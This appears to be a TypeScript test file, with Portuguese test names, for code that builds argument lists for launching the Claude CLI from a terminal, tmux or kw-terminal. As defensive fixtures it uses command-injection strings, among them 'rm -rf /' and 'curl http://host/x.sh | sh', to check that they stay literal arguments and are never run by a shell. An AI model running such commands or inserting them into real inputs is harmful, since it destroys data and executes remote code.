import { expect, test } from "bun:test";

import { buildClaudeArgv } from "@/lib/claude-command";
import { buildNoneCommandArgv, terminalCommandText } from "./command";

test("modo none: o argv da invocação vai inteiro para o spawn, sem virar texto de shell", () => {
	const argv = buildClaudeArgv({
		prompt: "leia $HOME; rm -rf /",
		permissionMode: "bypass",
		agent: "x; curl http://host/x.sh | sh #",
	});

	expect(buildNoneCommandArgv({ kind: "argv", argv }, "/bin/fish")).toEqual([
		"/bin/sh",
		"-c",
		'"$@"; exec "$0"',
		"/bin/fish",
		"claude",
		"--dangerously-skip-permissions",
		"--agent",
		"x; curl http://host/x.sh | sh #",
		"leia $HOME; rm -rf /",
	]);
});

test("modo none: comando de rota continua sendo texto de shell e mantém o shell aberto", () => {
	expect(buildNoneCommandArgv({ kind: "script", script: "bun dev" }, "/bin/fish")).toEqual([
		"/bin/fish",
		"-c",
		"bun dev; exec /bin/fish",
	]);
});

test("modo none: sem comando abre só o shell", () => {
	expect(buildNoneCommandArgv(undefined, "/bin/sh")).toEqual(["/bin/sh"]);
	expect(buildNoneCommandArgv({ kind: "script", script: "   " }, "/bin/sh")).toEqual(["/bin/sh"]);
	expect(buildNoneCommandArgv({ kind: "argv", argv: [] }, "/bin/sh")).toEqual(["/bin/sh"]);
});

test("tmux e kw-terminal recebem o argv serializado com quoting POSIX", () => {
	expect(
		terminalCommandText({
			kind: "argv",
			argv: buildClaudeArgv({ prompt: "faça `date`", permissionMode: "plan" }),
		}),
	).toBe("claude --permission-mode plan 'faça `date`'");
});
